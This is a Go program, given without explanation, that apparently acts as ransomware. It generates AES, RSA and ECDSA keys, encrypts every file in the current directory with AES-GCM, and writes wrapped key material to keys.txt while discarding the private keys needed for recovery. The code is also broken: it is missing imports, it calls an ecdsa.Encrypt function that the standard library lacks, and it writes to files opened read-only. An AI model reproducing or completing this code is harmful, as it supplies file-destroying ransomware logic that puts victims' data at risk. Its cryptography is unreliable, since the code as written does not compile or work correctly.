package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdsa"
	"crypto/rand"
	"crypto/rsa"
	"encoding/hex"
	"fmt"
	"io"
	"os"
)

func main() {
	aesKey := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, aesKey); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	rsaKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	ecdsaKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	rsaEncryptedAESKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, &rsaKey.PublicKey, aesKey, nil)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	ecdsaEncryptedRSAKey, err := ecdsa.Encrypt(rand.Reader, &ecdsaKey.PublicKey, rsaKey.PublicKey.N.Bytes())
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	files, err := ioutil.ReadDir(".")
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	for _, file := range files {
		if file.IsDir() {
			continue
		}
		f, err := os.Open(file.Name())
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
		defer f.Close()

		block, err := aes.NewCipher(aesKey)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}

		gcm, err := cipher.NewGCM(block)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}

		nonce := make([]byte, gcm.NonceSize())
		if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
			fmt.Println(err)
			os.Exit(1)
		}

		if err := encrypt(f, gcm, nonce); err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
	}

	f, err := os.Create("keys.txt")
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	defer f.Close()

	fmt.Fprintf(f, "AES Key: %s\n", hex.EncodeToString(rsaEncryptedAESKey))
	fmt.Fprintf(f, "RSA Key: %s\n", hex.EncodeToString(ecdsaEncryptedRSAKey))
}

func encrypt(f *os.File, gcm cipher.AEAD, nonce []byte) error {
	in, err := ioutil.ReadAll(f)
	if err != nil {
		return err
	}

	out := gcm.Seal(nil, nonce, in, nil)
	if _, err := f.Write(out); err != nil {
		return err
	}

	return nil
}
